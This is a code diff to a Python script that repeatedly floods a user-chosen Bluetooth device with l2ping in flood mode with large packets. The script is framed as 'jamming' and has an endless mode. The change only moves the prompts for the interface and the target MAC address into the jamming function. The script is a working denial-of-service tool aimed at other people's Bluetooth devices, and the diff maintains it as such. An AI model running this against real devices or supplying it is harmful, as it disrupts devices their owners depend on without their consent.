@@ -13,6 +13,8 @@ time = 999
 def endless_jamming():
     try:
         a = True
+        interface = input("Your BT interface : ")
+        mac = input("MAC of target: ")
         while a:
             xterm_1 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
             xterm_2 = "timeout 2s l2ping -i %s -s 600 -f %s" % (interface, mac)
@@ -40,8 +42,6 @@ def limited_jamming():
 
 def main():
     print(" ")
-    interface = input("Your BT interface : ")
-    mac = input("MAC of target: ")
     user_input = input("Do you want endless jamming? (yes/no): ")
     if user_input.lower() in ["yes", "y"]:
         print("Start jamming...")
